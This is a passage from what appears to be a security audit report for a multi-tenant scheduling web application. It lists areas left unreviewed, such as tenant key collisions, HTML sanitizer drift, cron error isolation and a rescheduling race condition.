- **Worker AI / chat memory KV** — `chat:history:<chatId>` TTL behaviour not reviewed for cross-tenant collisions (the prefix is `t:{tenantId}:` per CLAUDE.md, but `kv.list` calls weren't enumerated).
- **`sanitize-html` configuration regressions over time** — only the current profile bundle was reviewed; the audit can't see how the allowlists evolved or whether downstream consumers ever bypass it.
- **Email transport security** — Resend webhook ingest signature is verified, but Resend → recipient delivery (DKIM/SPF/DMARC alignment) is operational, not in source.
- **Cron retry semantics** — `processPostVisitConfirmations`, `processBirthdayAndReturningPromos`, and the new `phasePluginCron` orchestrator were not deep-dived for the case where a misbehaving plugin's exception leaks the active D1 transaction state to siblings (the orchestrator uses try/catch per CLAUDE.md but the actual code was not re-read in this audit).
- **Drag-to-reschedule race** — `appointments.rescheduleAppointment` is documented as conflict-checked via `slotsBusy({ excludeAppointmentId })` but the SQL race (two simultaneous reschedules to the same slot) wasn't exercised.
